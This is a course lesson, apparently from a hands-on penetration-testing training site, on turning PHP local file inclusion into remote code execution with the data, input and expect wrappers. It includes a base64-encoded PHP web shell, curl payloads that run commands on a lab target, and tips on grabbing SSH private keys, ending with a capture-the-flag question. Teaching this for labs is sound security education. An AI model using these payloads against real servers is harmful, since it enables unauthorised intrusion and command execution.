
<h1>PHP Wrappers</h1>
<p>So far in this module, we have been exploiting file inclusion vulnerabilities to disclose local files through various methods. From this section, we will start learning how we can use file inclusion vulnerabilities to execute code on the back-end servers and gain control over them.</p>
<p>We can use many methods to execute remote commands, each of which has a specific use case, as they depend on the back-end language/framework and the vulnerable function's capabilities. One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session. For example, we may find the database password in a file like <code>config.php</code>, which may match a user's password in case they re-use the same password. Or we can check the <code>.ssh</code> directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key (<code>id_rsa</code>) and use it to SSH into the system.</p>
<p>Other than such trivial methods, there are ways to achieve remote code execution directly through the vulnerable function without relying on data enumeration or local file privileges. In this section, we will start with remote code execution on PHP web applications. We will build on what we learned in the previous section, and will utilize different <code>PHP Wrappers</code> to gain remote code execution. Then, in the upcoming sections, we will learn other methods to gain remote code execution that can be used with PHP and other languages as well.</p>
<hr/>
<h2>Data</h2>
<p>The <a href="https://www.php.net/manual/en/wrappers.data.php">data</a> wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (<code>allow_url_include</code>) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.</p>
<h4>Checking PHP Configurations</h4>
<p>To do so, we can include the PHP configuration file found at (<code>/etc/php/X.Y/apache2/php.ini</code>) for Apache or at (<code>/etc/php/X.Y/fpm/php.ini</code>) for Nginx, where <code>X.Y</code> is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the <code>base64</code> filter we used in the previous section, as <code>.ini</code> files are similar to <code>.php</code> files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:</p>
<pre><code class="language-shell-session">[!bash!]$ curl "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
&lt;!DOCTYPE html&gt;

&lt;html lang="en"&gt;
...SNIP...
 &lt;h2&gt;Containers&lt;/h2&gt;
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
&lt;p class="read-more"&gt;
</code></pre>
<p>Once we have the base64 encoded string, we can decode it and <code>grep</code> for <code>allow_url_include</code> to see its value:</p>
<pre><code class="language-shell-session">[!bash!]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
</code></pre>
<p>Excellent! We see that we have this option enabled, so we can use the <code>data</code> wrapper. Knowing how to check for the <code>allow_url_include</code> option can be very important, as <code>this option is not enabled by default</code>, and is required for several other LFI attacks, like using the <code>input</code> wrapper or for any RFI attack, as we'll see next. It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.</p>
<h4>Remote Code Execution</h4>
<p>With <code>allow_url_include</code> enabled, we can proceed with our <code>data</code> wrapper attack. As mentioned earlier, the <code>data</code> wrapper can be used to include external data, including PHP code. We can also pass it <code>base64</code> encoded strings with <code>text/plain;base64</code>, and it has the ability to decode them and execute the PHP code.</p>
<p>So, our first step would be to base64 encode a basic PHP web shell, as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ echo '&lt;?php system($_GET["cmd"]); ?&gt;' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
</code></pre>
<p>Now, we can URL encode the base64 string, and then pass it to the data wrapper with <code>data://text/plain;base64,</code>. Finally, we can use pass commands to the web shell with <code>&amp;cmd=&lt;COMMAND&gt;</code>:
<img alt="Shipping containers and cranes at a port with a PHP notice about an undefined variable." class="website-screenshot" data-url="http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id" src="/storage/modules/23/data_wrapper_id.png"/></p>
<p>We may also use cURL for the same attack, as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ curl -s 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<hr/>
<h2>Input</h2>
<p>Similar to the <code>data</code> wrapper, the <a href="https://www.php.net/manual/en/wrappers.php.php">input</a> wrapper can be used to include external input and execute PHP code. The difference between it and the <code>data</code> wrapper is that we pass our input to the <code>input</code> wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the <code>input</code> wrapper also depends on the <code>allow_url_include</code> setting, as mentioned earlier.</p>
<p>To repeat our earlier attack but with the <code>input</code> wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:</p>
<pre><code class="language-shell-session">[!bash!]$ curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use <code>$_REQUEST</code>). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. <code>&lt;\?php system('id')?&gt;</code>)</p>
</div>
</div>
<hr/>
<h2>Expect</h2>
<p>Finally, we may utilize the <a href="https://www.php.net/manual/en/wrappers.expect.php">expect</a> wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.</p>
<p>However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with <code>allow_url_include</code> earlier, but we'd <code>grep</code> for <code>expect</code> instead, and if it is installed and enabled we'd get the following:</p>
<pre><code class="language-shell-session">[!bash!]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
</code></pre>
<p>As we can see, the <code>extension</code> configuration keyword is used to enable the <code>expect</code> module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the <code>expect://</code> wrapper and then pass the command we want to execute, as follows:</p>
<pre><code class="language-shell-session">[!bash!]$ curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>As we can see, executing commands through the <code>expect</code> module is fairly straightforward, as this module was designed for command execution, as mentioned earlier. The <a href="/module/details/134">Web Attacks</a> module also covers using the <code>expect</code> module with XXE vulnerabilities, so if you have a good understanding of how to use it here, you should be set up for using it with XXE.</p>
<p>These are the most common three PHP wrappers for directly executing system commands through LFI vulnerabilities. We'll also cover the <code>phar</code> and <code>zip</code> wrappers in upcoming sections, which we may use with web applications that allow file uploads to gain remote execution through LFI vulnerabilities.</p>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                    </span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="91"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> Try to gain RCE using one of the PHP wrappers and read the flag at /
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer91" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-91">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="91" id="btnAnswer91">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
